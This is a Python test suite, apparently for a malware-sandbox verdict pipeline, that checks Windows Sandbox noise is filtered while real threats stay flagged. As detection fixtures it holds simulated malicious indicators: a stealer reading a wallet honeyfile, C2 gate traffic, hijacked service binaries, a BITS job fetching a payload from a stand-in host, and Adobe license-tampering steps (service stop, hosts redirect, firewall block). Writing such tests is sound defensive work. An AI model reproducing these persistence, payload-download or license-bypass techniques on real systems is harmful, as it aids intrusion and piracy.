    j_legacy.state["stages"]["sandbox"]["status"] = "done"
    j_legacy.state["behavior"] = pipeline.sanitize_sandbox_json({
        "HoneyfileAlerts": [r"ACCESSED (infostealer read): C:\Users\WDAGUtilityAccount\Desktop\wallet_keys.txt"],
    })
    pipeline.compute_verdict(j_legacy)
    assert j_legacy.state["verdict"]["level"] == "yellow"
    assert j_legacy.state["verdict"]["red"] == []
    assert any("arka plan taraması olabilir" in n for n in j_legacy.state["verdict"]["notes"])

    # 2. 4663 process-attributed read OR MODIFIED/DELETED triggers red
    j_real = bare_job(tmp_path / "real_honey")
    j_real.state["behavior"] = pipeline.sanitize_sandbox_json({
        "HoneyfileAlerts": [r"ACCESSED (infostealer read by stealer.exe pid=4321): C:\Users\WDAGUtilityAccount\Desktop\wallet_keys.txt"],
    })
    pipeline.compute_verdict(j_real)
    assert j_real.state["verdict"]["level"] == "red"
    assert any("read by stealer.exe" in r for r in j_real.state["verdict"]["red"])

    # 3. UDP SSDP M-SEARCH on 239.255.255.250:1900 is omitted from HTTP rows
    pcap = tmp_path / "ssdp.pcap"
    pcap.write_bytes(b"pcap")
    monkeypatch.setattr(sbm, "tshark_path", lambda: "tshark.exe")
    monkeypatch.setattr(pipeline, "_tshark_fields", lambda _t, _p, flt, _f: (
        [["239.255.255.250:1900", "M-SEARCH", "*", "239.255.255.250", "", ""],
         ["real-c2.example", "GET", "/gate", "185.10.20.30", "", "80"]]
        if flt == "http.request" else []
    ))
    ns = pipeline.network_summary(pcap)
    assert [h["host"] for h in ns["http"]] == ["real-c2.example"]


def test_win11_wsb_idle_isolation_service_and_cbs_webview_noise_filtered(tmp_path):
    j_clean = bare_job(tmp_path / "clean_wsb")
    j_clean.state["status"] = "done"
    for st in ("extract", "inventory", "static", "vt", "sandbox"):
        j_clean.state["stages"][st]["status"] = "done"
    j_clean.state["network"] = {"dns": [], "sni": [], "http": [], "ips": [], "total_packets": 10}
    j_clean.state["vt"] = [{"rel": "sample.sfv", "status": "VT'de kayıtlı", "result": {"stats": {"malicious": 0, "suspicious": 0}, "total": 60, "engines": []}}]
    j_clean.state["behavior"] = pipeline.sanitize_sandbox_json({
        "Target": "sample.exe",   # a sample did run; this test is about filtering Windows Sandbox noise
        "Persistence": {
            "Services": [r"IsolationSession | Manual | C:\Windows\system32\svchost.exe -k IsolationSession -p"],
        },
        "Files": {
            "NewExecutables": [
                r"C:\Users\WDAGUtilityAccount\AppData\Local\Packages\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\LocalState\EBWebView\Speech Recognition\1.15.0.1\Microsoft.CognitiveServices.Speech.core.dll",
                r"C:\Users\WDAGUtilityAccount\AppData\Local\Packages\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\LocalState\EBWebView\Subresource Filter\Unindexed Rules\10.34.0.84\adblock_snippet.js",
            ],
        },
    })
    pipeline.compute_verdict(j_clean)
    assert j_clean.state["verdict"]["level"] == "green"
    assert j_clean.state["verdict"]["red"] == []
    assert j_clean.state["verdict"]["notes"] == []

    # Spoofed service named IsolationSession pointing to a malicious binary must STILL trigger red
    j_spoof = bare_job(tmp_path / "spoof_svc")
    j_spoof.state["behavior"] = pipeline.sanitize_sandbox_json({
        "Persistence": {
            "Services": [r"IsolationSession | Auto | C:\Users\Public\evil.exe"],
        },
    })
    pipeline.compute_verdict(j_spoof)
    assert j_spoof.state["verdict"]["level"] == "red"
    assert any("yeni servis" in r for r in j_spoof.state["verdict"]["red"])






# ---------------------------------------------------------------- nothing executed in the sandbox
def test_sandbox_with_no_target_is_not_green(tmp_path):
    job = bare_job(tmp_path)
    job.state["status"] = "done"
    for k in ("extract", "inventory", "static", "vt", "sandbox", "report"):
        job.state["stages"][k]["status"] = "done"
    job.state["behavior"] = pipeline.sanitize_sandbox_json({"Target": None, "TargetNote": "Disk goruntusu baglanamadi: x.iso: access denied"})
    pipeline.compute_verdict(job)
    v = job.state["verdict"]
    assert v["level"] != "green"
    assert "Sandbox" in v["not_run"]
    assert any("çalıştırılacak dosya bulunamadı" in n and "baglanamadi" in n for n in v["notes"])


# ---------------------------------------------------------------- crack / license tampering category
def _static_entry(rel, *, spoof=False, license_script=False, malware_yara=False):
    st = {"rel": rel, "signature": {"status": "NotSigned"}, "risk_score": 40, "yara_matches": [],
          "string_findings": [], "format_findings": [], "spoof_flags": []}
    if spoof:
        st["spoof_flags"].append({"type": "vendor_impersonation", "severity": "high",
                                  "reason": "Sahte üretici kimliği şüphesi: 'Adobe Inc.' ama imzasız"})
    if license_script:
        st["format_findings"].append({"category": "Kurulum / Lisans Müdahale Betiği", "severity": "high",
                                      "description": "sc stop AGSService, schtasks /delete"})
        st["yara_matches"].append({"rule": "SafeBox_License_Service_Tamper", "severity": "medium", "description": "license"})
    if malware_yara:
        st["yara_matches"].append({"rule": "SafeBox_Credential_Stealer_Browser_Targets", "severity": "critical", "description": "stealer"})
    return st


def test_crack_typical_findings_are_their_own_category(tmp_path):
    job = bare_job(tmp_path)
    job.state["static"] = [_static_entry("Set-up.exe", spoof=True), _static_entry("RunOnce.cmd", license_script=True)]
    job.state["behavior"] = pipeline.sanitize_sandbox_json({"Hosts": {"Added": ["127.0.0.1 lm.licenses.adobe.com"]},
                                                           "Firewall": {"Added": ["Block Adobe"]}, "Target": "Set-up.exe"})
    pipeline.compute_verdict(job)
    v = job.state["verdict"]
    assert v["red"] == [], v["red"]
    assert v["level"] == "yellow"
    text = " ".join(v["crack"])
    for needle in ("Sahte üretici", "Lisans Müdahale", "License_Service_Tamper", "hosts", "güvenlik duvarı"):
        assert needle in text


def test_crack_disguise_does_not_hide_real_malware(tmp_path):
    """The same file also shows a stealer rule -> its crack-looking findings stay red too."""
    job = bare_job(tmp_path)
    job.state["static"] = [_static_entry("Set-up.exe", spoof=True, license_script=True, malware_yara=True)]
    pipeline.compute_verdict(job)
    v = job.state["verdict"]
    assert v["level"] == "red"
    red = " ".join(v["red"])
    assert "Sahte üretici" in red and "Lisans Müdahale" in red and "Credential_Stealer" in red
    assert not v["crack"]


def test_defender_changes_stay_red_even_with_crack_findings(tmp_path):
    job = bare_job(tmp_path)
    job.state["static"] = [_static_entry("RunOnce.cmd", license_script=True)]
    job.state["behavior"] = pipeline.sanitize_sandbox_json({"Defender": {"Added": ["ExclusionPath: C:\Program Files\Adobe"]},
                                                           "Target": "Set-up.exe"})
    pipeline.compute_verdict(job)
    assert job.state["verdict"]["level"] == "red"


# ---------------------------------------------------------------- Windows' own service/BITS changes are not red
def test_service_start_mode_change_and_windows_bits_job_are_not_red(tmp_path):
    job = bare_job(tmp_path)
    job.state["behavior"] = pipeline.sanitize_sandbox_json({
        "Target": "Set-up.exe",
        "Persistence": {
            "ServicesChanged": [
                r"BITS | Manual | C:\Windows\System32\svchost.exe -k netsvcs -p -> BITS | Auto | C:\Windows\System32\svchost.exe -k netsvcs -p",
                r"RemoteRegistry | Disabled | C:\Windows\system32\svchost.exe -k localService -p -> RemoteRegistry | Auto | C:\Windows\system32\svchost.exe -k localService -p",
            ],
            "BitsJobs": ["Font Download | Download | TransientError | https://fs.microsoft.com/fs/windows/config.json"],
        }})
    pipeline.compute_verdict(job)
    v = job.state["verdict"]
    assert v["red"] == [], v["red"]
    mode_notes = [n for n in v["notes"] if "başlatma türü değişti" in n]
    assert mode_notes and "RemoteRegistry" in mode_notes[0] and "BITS" not in mode_notes[0]   # BITS flip = Windows Sandbox noise


def test_service_binary_swap_and_foreign_bits_job_stay_red(tmp_path):
    job = bare_job(tmp_path)
    job.state["behavior"] = pipeline.sanitize_sandbox_json({
        "Target": "Set-up.exe",
        "Persistence": {
            "ServicesChanged": [r"BITS | Manual | C:\Windows\System32\svchost.exe -k netsvcs -p -> BITS | Auto | C:\Users\Public\evil.exe"],
            "BitsJobs": ["Updater | Download | Transferring | https://evil-c2.xyz/payload.bin,https://fs.microsoft.com/a"],
        }})
    pipeline.compute_verdict(job)
    red = " ".join(job.state["verdict"]["red"])
    assert "servis ele geçirme" in red and "BITS" in red


def test_crack_points_do_not_trigger_high_static_score(tmp_path):
    """Unsigned 20 + vendor impersonation 30 + a little more must not add a 'high static risk' note on top of the
    crack list; the same score from malware signals still does."""
    job = bare_job(tmp_path)
    st = _static_entry("Set-up.exe", spoof=True)
    st["spoof_flags"][0]["points"] = 30
    st["pe_info"] = {"is_pe": True}
    st["risk_score"] = 66
    job.state["static"] = [st]
    job.state["behavior"] = pipeline.sanitize_sandbox_json({"Target": "Set-up.exe"})
    pipeline.compute_verdict(job)
    v = job.state["verdict"]
    assert not any("risk puanı" in x for x in v["notes"] + v["red"]), v
    assert v["crack"]

    job2 = bare_job(tmp_path, "t2")
    st2 = _static_entry("Set-up.exe", malware_yara=True)
    st2["risk_score"] = 80
    job2.state["static"] = [st2]
    pipeline.compute_verdict(job2)
    assert any("risk puanı" in x for x in job2.state["verdict"]["red"])


def test_memory_findings_windows_wallpaper_links_are_not_red(tmp_path):
    """Seen in a real run: cmd.exe running a harmless .bat had Windows 11 Spotlight/Bing links in memory."""
    job = bare_job(tmp_path)
    job.state["behavior"] = pipeline.sanitize_sandbox_json({"Target": "Set-up.bat", "MemoryFindings": [
        "[cmd.exe:5492] https://blogs.windows.com/windowsexperience/2021/10/06/x/fmicrosoft-edge:https://www.bing.com/search?q=Hamilton",
        "[cmd.exe:5492] https://www.bing.com/search?q=Yaquina+Head+Lighthouse",
    ]})
    pipeline.compute_verdict(job)
    v = job.state["verdict"]
    assert not any("bellek" in x.lower() for x in v["red"] + v["notes"]), v

    job2 = bare_job(tmp_path, "t2")
    job2.state["behavior"] = pipeline.sanitize_sandbox_json({"Target": "Set-up.exe", "MemoryFindings": [
        "[Set-up.exe:10] api.telegram.org/bot", "[Set-up.exe:10] https://unknown-host.example/gate.php"]})
    pipeline.compute_verdict(job2)
    v2 = job2.state["verdict"]
    assert any("api.telegram.org/bot" in x for x in v2["red"])
    assert not any("unknown-host" in x for x in v2["red"])
    assert any("unknown-host" in x for x in v2["notes"])


def test_isolation_session_mode_change_and_softlanding_tasks_are_noise(tmp_path):
    job = bare_job(tmp_path)
    sid = "S-1-5-21-2047949552-857980807-821054962-504"
    job.state["behavior"] = pipeline.sanitize_sandbox_json({"Target": "Set-up.exe", "Persistence": {
        "ServicesChanged": [r"IsolationSession | Auto | C:\Windows\system32\svchost.exe -k IsolationSession -p -> "
                            r"IsolationSession | Manual | C:\Windows\system32\svchost.exe -k IsolationSession -p"],
        "Tasks": [rf"\SoftLanding\{sid}\SoftLandingDeferralTask-{{0bc7bc3a-1baf-4f4f-98f4-e3637db840b1}} | ",
                  rf"\SoftLanding\{sid}\SoftLandingTriggerTask-128000000001615609-render-{{26133d04-ad42-449f-aba9-9fd36bab83fb}} | "],
    }})
    pipeline.compute_verdict(job)
    text = " ".join(job.state["verdict"]["notes"] + job.state["verdict"]["red"])
    assert "IsolationSession" not in text and "zamanlanmış görev" not in text

    job2 = bare_job(tmp_path, "t2")
    job2.state["behavior"] = pipeline.sanitize_sandbox_json({"Target": "Set-up.exe", "Persistence": {
        "ServicesChanged": [r"IsolationSession | Auto | C:\Windows\system32\svchost.exe -k IsolationSession -p -> "
                            r"IsolationSession | Auto | C:\Users\Public\svc.exe"],
        "Tasks": [rf"\SoftLanding\{sid}\SoftLandingDeferralTask-{{x}} | C:\Users\Public\run.exe"],
    }})
    pipeline.compute_verdict(job2)
    v2 = job2.state["verdict"]
    assert any("servis ele geçirme" in x for x in v2["red"])
    assert any("1 yeni zamanlanmış görev" in x for x in v2["notes"])


def _stalled_behavior(**extra):
    b = {"Target": "autoplay.exe", "Processes": [{"Name": "autoplay.exe", "Pid": 5892, "InTree": True}],
         "AutoClicks": [], "Files": {"NewExecutables": [
             r"C:\Users\WDAGUtilityAccount\AppData\Local\Packages\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\LocalState\EBWebView\x.dll"]}}
    b.update(extra)
    return pipeline.sanitize_sandbox_json(b)


def test_installer_that_never_started_is_flagged(tmp_path):
    job = bare_job(tmp_path)
    job.state["status"] = "done"
    for k in ("extract", "inventory", "static", "vt", "sandbox", "report"):
        job.state["stages"][k]["status"] = "done"
    job.state["behavior"] = _stalled_behavior()
    pipeline.compute_verdict(job)
    v = job.state["verdict"]
    assert v["level"] == "yellow" and v.get("install_not_started") is True
    assert "Kurulum" in v["not_run"]
    assert any("Kurulum başlamamış" in n and "autoplay.exe" in n for n in v["notes"])


@pytest.mark.parametrize("extra", [
    {"Processes": [{"Name": "autoplay.exe", "Pid": 1, "InTree": True}, {"Name": "Set-up.exe", "Pid": 2, "InTree": True}]},
    {"AutoClicks": ["Install"]},
    {"Files": {"NewExecutables": [r"C:\Program Files\Adobe\Photoshop.exe"]}},
    {"Target": "payload.exe"},
])
def test_installer_that_did_something_is_not_flagged(tmp_path, extra):
    job = bare_job(tmp_path)
    job.state["behavior"] = _stalled_behavior(**extra)
    pipeline.compute_verdict(job)
    assert not job.state["verdict"].get("install_not_started")


def test_crashes_become_a_plain_note(tmp_path):
    job = bare_job(tmp_path)
    job.state["static"] = [_static_entry("Set-up.exe", spoof=True)]
    job.state["behavior"] = pipeline.sanitize_sandbox_json({"Target": "Set-up.exe", "Crashes": [
        r"Photoshop.exe 27.11.0.26 | module ntdll.dll | code 0xc0000409 | fastfail 10 | offset 0x127670 | x2 | first 00:32:18 | C:\Program Files\Adobe\Adobe Photoshop 2026\Photoshop.exe",
        r"helper.exe 1.0 | module helper.dll | code 0xc0000005 | offset 0x10 | x1 | first 00:33:00 | C:\x\helper.exe",
    ]})
    pipeline.compute_verdict(job)
    v = job.state["verdict"]
    assert not any("çöktü" in x for x in v["red"])
    note = next(n for n in v["notes"] if "çöktü" in n)
    assert "3 çökme" in note and "Photoshop.exe 2 kez" in note and "Control Flow Guard" in note
    assert "geçersiz bellek erişimi" in note and "crack bulguları" in note
    rep = pipeline.render_report(job) if hasattr(pipeline, "render_report") else ""
    job2 = bare_job(tmp_path, "t2")
    job2.state["behavior"] = pipeline.sanitize_sandbox_json({"Target": "Set-up.exe", "Crashes": []})
    pipeline.compute_verdict(job2)
    assert not any("çöktü" in x for x in job2.state["verdict"]["notes"])
